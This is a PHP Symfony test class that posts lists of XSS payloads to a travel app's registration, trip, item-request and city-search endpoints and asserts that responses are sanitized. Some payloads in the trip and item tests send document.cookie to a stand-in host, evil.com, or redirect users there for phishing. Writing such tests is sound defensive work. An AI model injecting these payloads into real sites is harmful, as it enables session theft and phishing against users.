<?php
/**
 * Security test suite for Cross-Site Scripting (XSS) protection validation.
 * 
 * This test class validates XSS attack prevention mechanisms including:
 * - Basic XSS payload detection and filtering
 * - Advanced XSS attack vector protection
 * - Input sanitization effectiveness
 * - Output encoding verification
 * - Client-side script injection prevention
 * 
 * Critical for protecting users from malicious script injection attacks
 * and maintaining application security integrity.
 * 
 * @package App\Tests\Security
 * @author Travel Project Team
 */

namespace App\Tests\Security;

use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
use Symfony\Component\HttpFoundation\Response;

/**
 * Security tests for XSS (Cross-Site Scripting) protection.
 * 
 * Tests various XSS attack vectors to ensure the application
 * properly sanitizes input and prevents script injection.
 */
final class XSSSecurityTest extends WebTestCase
{
    /**
     * Test protection against basic XSS attack vectors.
     * 
     * Verifies that:
     * - Common XSS payloads are properly handled
     * - Malicious scripts are not executed or stored
     * - Response content is properly sanitized
     * - Application doesn't crash or expose vulnerabilities
     * - Security measures are effective against standard attacks
     */
    public function testBasicXSSProtection(): void
    {
        // Arrange: Create test client and define basic XSS payloads
        $client = static::createClient();
        
        // Common XSS attack vectors to test
        $basicXSSPayloads = [
            '<script>alert("XSS")</script>',        // Basic script injection
            '<img src=x onerror=alert("XSS")>',     // Image event handler
            '<svg onload=alert("XSS")>',            // SVG event handler
            '<iframe src="javascript:alert(\'XSS\')">',  // JavaScript URL
            '<body onload=alert("XSS")>',           // Body event handler
        ];

        // Act & Assert: Test each payload against user registration endpoint
        foreach ($basicXSSPayloads as $payload) {
            // Prepare test data with XSS payload in username field
            $userData = [
                'username' => $payload,
                'email' => 'xss_' . uniqid() . '@test.com',
                'password' => 'password123'
            ];

            // Send request with XSS payload
            $client->request('POST', '/api/users/register', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($userData)
            );

            $responseCode = $client->getResponse()->getStatusCode();
            
            // Assert: Application should handle payload gracefully
            $this->assertContains($responseCode, [
                Response::HTTP_CREATED,           // Successfully filtered and created
                Response::HTTP_BAD_REQUEST,       // Rejected invalid input
                Response::HTTP_CONFLICT,          // Duplicate data conflict
                Response::HTTP_INTERNAL_SERVER_ERROR  // Server error but no security compromise
            ], "Basic XSS payload should be handled: $payload");

            // If request succeeded, verify response is sanitized
            if ($responseCode === Response::HTTP_CREATED) {
                $responseContent = $client->getResponse()->getContent();
                $this->assertStringNotContainsString('<script>', $responseContent);
                $this->assertStringNotContainsString('javascript:', $responseContent);
                $this->assertStringNotContainsString('onload=', $responseContent);
                $this->assertStringNotContainsString('onerror=', $responseContent);
            }
        }
    }

    /**
     * Test protection against advanced XSS attack vectors.
     * 
     * Verifies that:
     * - Sophisticated XSS payloads are blocked
     * - Encoded and obfuscated scripts are detected
     * - Context-breaking attacks are prevented
     * - Advanced evasion techniques are thwarted
     * - Security is robust against modern attack methods
     */
    public function testAdvancedXSSProtection(): void
    {
        // Arrange: Create test client and define advanced XSS payloads
        $client = static::createClient();
        
        // Advanced XSS attack vectors with evasion techniques
        $advancedXSSPayloads = [
            // Context breaking with quote injection
            '"><script>alert("XSS")</script>',
            // Polyglot payload with multiple contexts
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
            // Image with event handler injection
            '<img src="x" onerror="alert(\'XSS\')" />',
            // SVG with embedded script
            '<svg><script>alert("XSS")</script></svg>',
            // Complex evasion payload
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
            // Character code obfuscation
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
        ];

        // Act & Assert: Test each advanced payload
        foreach ($advancedXSSPayloads as $payload) {
            // Prepare test data with XSS payload in password field
            $userData = [
                'username' => 'user_' . uniqid(),
                'email' => 'xss_' . uniqid() . '@test.com',
                'password' => $payload  // Try XSS in password field
            ];

            // Send request with advanced XSS payload
            $client->request('POST', '/api/users/register', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($userData)
            );

            $responseCode = $client->getResponse()->getStatusCode();
            
            // Assert: Advanced payloads should also be handled safely
            $this->assertContains($responseCode, [
                Response::HTTP_CREATED,           // Successfully filtered
                Response::HTTP_BAD_REQUEST,       // Rejected as invalid
                Response::HTTP_CONFLICT
            ], "Advanced XSS payload should be handled safely");

            // Ensure no executable code in response
            $responseContent = $client->getResponse()->getContent();
            $this->assertStringNotContainsString('<script>', $responseContent);
            $this->assertStringNotContainsString('eval(', $responseContent);
            $this->assertStringNotContainsString('String.fromCharCode', $responseContent);
        }
    }

    public function testXSSInTripData(): void
    {
        $client = static::createClient();
        
        $xssPayloads = [
            '<script>document.location="http://evil.com"</script>',
            '<img src=1 onerror=window.open("http://evil.com")>',
            'javascript:void(document.cookie="stolen="+document.cookie)',
        ];

        foreach ($xssPayloads as $payload) {
            $tripData = [
                'city' => $payload,
                'country' => 'TestCountry',
                'startDate' => '2025-07-25',
                'endDate' => '2025-07-30'
            ];

            $client->request('POST', '/api/trips/add', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($tripData)
            );

            // Will return 401 due to auth, but server shouldn't crash
            $this->assertResponseStatusCodeSame(Response::HTTP_UNAUTHORIZED);
        }

        // Verify system is still responsive
        $client->request('POST', '/api/users/register', [], [], 
            ['CONTENT_TYPE' => 'application/json'],
            json_encode([
                'username' => 'afterxss_' . uniqid(),
                'email' => 'afterxss_' . uniqid() . '@test.com',
                'password' => 'password123'
            ])
        );
        $this->assertResponseIsSuccessful();
    }

    public function testXSSInItemRequests(): void
    {
        $client = static::createClient();
        
        $xssPayloads = [
            '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
            '<img src=x onerror=this.src="http://evil.com/steal?cookie="+document.cookie>',
            '<svg onload="location.href=\'http://evil.com/phish\'">',
        ];

        foreach ($xssPayloads as $payload) {
            $itemData = [
                'name' => $payload
            ];

            $client->request('POST', '/api/item-requests', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($itemData)
            );

            // Will return 401 due to auth requirement
            $this->assertResponseStatusCodeSame(Response::HTTP_UNAUTHORIZED);
        }

        // System should remain functional
        $client->request('GET', '/api/items');
        $this->assertResponseStatusCodeSame(Response::HTTP_UNAUTHORIZED);
    }

    public function testReflectedXSSProtection(): void
    {
        $client = static::createClient();
        
        // Test XSS in query parameters
        $xssPayloads = [
            '<script>alert("Reflected XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
        ];

        foreach ($xssPayloads as $payload) {
            // Try XSS in search parameter
            $client->request('GET', '/api/cities', ['q' => $payload]);
            
            $response = $client->getResponse();
            $content = $response->getContent();
            
            // Response should not contain unescaped XSS payload
            $this->assertStringNotContainsString('<script>', $content);
            $this->assertStringNotContainsString('javascript:', $content);
            $this->assertStringNotContainsString('onerror=', $content);
            
            // But should handle the request gracefully
            $this->assertContains($response->getStatusCode(), [
                Response::HTTP_OK,
                Response::HTTP_BAD_REQUEST
            ]);
        }
    }
}
